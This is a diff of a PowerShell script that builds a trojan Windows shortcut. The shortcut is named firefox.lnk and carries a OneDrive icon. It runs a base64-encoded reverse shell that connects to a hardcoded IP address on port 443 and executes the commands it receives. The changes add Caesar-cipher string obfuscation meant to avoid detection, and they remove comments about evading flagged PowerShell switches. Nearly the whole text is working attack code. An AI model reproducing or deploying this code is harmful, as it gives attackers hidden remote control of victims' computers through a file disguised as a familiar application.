@@ -1,27 +1,38 @@
-param([string]$ip,[string]$port)
+param([string]$ip,[string]$port,[int]$offset=4)
+$offset = 4
 
-#reverse shell
-$code=@'
-$x=(New-Object net.sock''ets.tcpc''lient("~",^)).('gets'+'tream')();[byte[]]$b=0..65535|%{0};while(($i=$x.('rea'+'d')($b,0,$b.Length))-ne 0){$d=([system.text.encoding]::getencoding(20127)).('getb'+'ytes')(((i''ex((New-Object -t text.asciie''ncoding).('gets'+'tring')($b,0,$i))2>&1|out-string)+(pwd).path+"> "));$x.write($d,0,$d.Length);$x.flush()}
-'@ -replace '~',$ip -replace '\^',$port
+$rev_shell = @'
+$x=(New-Object net.sockets.tcpclient("192.168.1.26",443)).getstream();[byte[]]$b=0..65535|%{0};while(($i=$x.read($b,0,$b.Length))-ne 0){$d=([system.text.encoding]::getencoding(20127)).getbytes(((iex((New-Object -t text.asciiencoding).getstring($b,0,$i))2>&1|out-string)+(pwd).path+"> "));$x.write($d,0,$d.Length);$x.flush()}
+'@ -replace '~',$ip -replace '!',$port
 
-#convert code to base64
-$b64 = [Convert]::ToBase64String(([System.Text.Encoding]::ascii.GetBytes($code)))
+$b64 = [convert]::ToBase64String([text.encoding]::ASCII.GetBytes($rev_shell))
 
-#making the lnk file
+$strings = @("assembly",'gettype','System.Text.Encoding','System.Convert','ascii','getstring','frombase64string',$b64)
+
+#used to format after string obfuscation and fix formatting errors
+$start = "([string]::new([char[]](('"
+$end = "'"+'|fhx).Bytes|%{$johnxor-'+"$offset})))"
+$fix = @'
+'+"'"+'
+'@
+
+#caesar cipher tiem
+function hide{
+    param([string]$plaintext)
+    (($plaintext-split''|%{[int][char]$_+$offset}|%{[char]$_})-join'' -replace '`','``' -replace "'",$fix) -replace "^",$start -replace '$',$end -replace 'johnxor','_'
+
+}
+
+$strings = $strings|%{hide($_)}
+
+#decoded is [type].assembly.gettype('System.Convert')::frombase64string(SomeBase64)|i`ex
+$final = ' [text.encoding]::ascii.getstring([type].'+$strings[0]+'.'+$strings[1]+'('+$strings[3]+')::'+$strings[6]+'('+$strings[7]+'))|i`ex'
+
+#making the lnk
 $WshShell = New-Object -comObject WScript.Shell
-
-#I guess you could change the output folder if you want
-$Shortcut = $WshShell.CreateShortcut("C:\Users\"+$env:USERNAME+"\Desktop\onedrive.lnk")
+$Shortcut = $WshShell.CreateShortcut("C:\Users\"+$env:USERNAME+"\Desktop\firefox.lnk")
 $Shortcut.RelativePath =  "powershell"
-
-#edit here if you want a different icon, no it doesn't save the icon to it so i'd pick a popular path one target will have
-#$Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
+$Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
 $Shortcut.TargetPath = "powershell"
-
-#fist bit is to decode the base64 then execute it, avoids using -encodedCommand switch which gets flagged a lot
-$Shortcut.Arguments = ("[text.encoding]::ascii.getstring([convert]::('fr'+'om'+'base6'+'4st'+'ri'+'ng')('"+$64+"'))|powershell")
-
-#start powershell minimized and then you can hide it
-$Shortcut.WindowStyle = 7
+$Shortcut.Arguments = ($final)
 $Shortcut.Save()
